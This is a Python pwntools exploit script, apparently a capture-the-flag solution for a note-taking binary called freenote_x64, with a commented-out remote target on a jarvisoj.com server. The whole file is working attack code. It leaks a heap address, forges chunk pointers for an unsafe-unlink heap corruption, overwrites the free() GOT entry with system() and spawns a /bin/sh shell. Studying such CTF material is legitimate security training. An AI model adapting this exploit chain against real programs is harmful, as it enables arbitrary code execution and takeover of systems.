from pwn import *
import binascii

p = process('./freenote_x64')
# p = remote('pwn2.jarvisoj.com', 9886)

def new_note(x):
    p.recvuntil('Your choice: ')
    p.send('2\n')
    p.recvuntil('Length of new note: ')
    p.send(str(len(x))+'\n')
    p.recvuntil('Enter your note: ')
    p.send(x)

def list_note():
    p.recvuntil('Your choice: ')
    p.send('1\n')

def delete_note(x):
    p.recvuntil('Your choice: ')
    p.send('4\n')
    p.recvuntil('Note number: ')
    p.send(str(x)+'\n')

def edit_note(x, y):
    p.recvuntil("Your choice: ")
    p.send("3\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(y)

#####################################leak heap addr#############################

new_note('A')
new_note('B')
new_note('C')
new_note('D')
delete_note(0)
delete_note(2)

new_note("abcdabcd")

list_note()
p.recvuntil('0. abcdabcd')
x = p.recvuntil('\n')

leak = u64(x[0:-1].ljust(8, '\x00'))
print "heap address: " + hex(leak)
base_addr = leak - 0x90 * 2 - (0x604820 - 0x603000)

delete_note(0)
delete_note(1)
delete_note(3)

fake_fd = base_addr + (0x603030 - 0x603000) - 0x8 * 3
fake_bk = fake_fd + 0x8
print hex(fake_fd)

payload = ""
payload += p64(0x0) + p64(0x80 + 0x90 * 2 + 0x1) + p64(fake_fd) + p64(fake_bk)
new_note(payload)

new_note("/bin/sh\x00")

payload2 = "A" * 0x80
payload2 += p64(0x80 + 0x90 * 2) + p64(0x90) + 'A' * 0x80
payload2 += p64(0x0)+ p64(0x91) + 'A' * 0x80
payload2 += p64(0x0)+ p64(0x91) + 'A' * 0x80

new_note(payload2)

delete_note(3)

payload3 = p64(0x2) + p64(0x1) + p64(0x8) + p64(0x602018)
edit_note(0, payload3)
list_note()
p.recvuntil('0. ')
x = p.recvuntil('\n')
free_addr = u64(x[0:-1].ljust(8, '\x00'))
print "free address: " + hex(free_addr)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc-2.19.so')
offset =  libc.symbols['free'] - libc.symbols['system']
system_addr = free_addr - offset
print 'system address: ' + hex(system_addr)
edit_note(0, p64(system_addr))

delete_note(1)

p.interactive()
